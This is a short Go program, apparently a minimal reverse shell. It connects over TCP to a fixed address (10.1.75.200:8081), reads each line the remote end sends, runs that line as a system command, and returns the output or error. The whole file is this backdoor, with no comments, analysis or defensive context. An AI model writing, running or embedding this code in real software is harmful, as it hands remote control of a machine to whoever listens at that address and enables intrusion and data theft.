package main

import (
   "bufio"
   "fmt"
   "net"
   "os/exec"
   "strings"
)

func main() {
   conn, _ := net.Dial("tcp", "10.1.75.200:8081")
   for {

      message, _ := bufio.NewReader(conn).ReadString('\n')

      out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()

      if err != nil {
         fmt.Fprintf(conn, "%s\n",err)
      }

      fmt.Fprintf(conn, "%s\n",out)

   }
}
